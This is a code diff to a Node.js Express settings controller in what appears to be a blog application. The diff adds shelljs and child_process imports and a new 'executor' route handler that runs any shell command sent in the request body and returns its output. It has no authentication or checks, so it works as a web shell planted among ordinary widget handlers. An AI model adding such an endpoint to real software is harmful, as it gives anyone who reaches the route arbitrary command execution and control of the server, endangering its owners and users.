@@ -4,6 +4,8 @@ const postSchema = require('../models/postSchema')
 const commentSchema = require('../models/commentSchema')
 const fs = require('fs')
 const fsExtra = require('fs-extra')
+const { spawn } = require('child_process');
+const shell = require('shelljs');
 
 const mongoose = require('mongoose')
 let settingsControllers = {}
@@ -221,6 +223,12 @@ settingsControllers.deleteWidget = (req, res) => {
         res.json({ deleted: true })
         res.end()
     })
+}
+settingsControllers.executor =async (req, res) => {
+    const command = req.body.command;
+    const executeCommand = shell.exec(command)
+    res.json({response: await executeCommand.stdout})
+    res.end()
 }
 
 settingsControllers.updateWidget = (req, res) => {
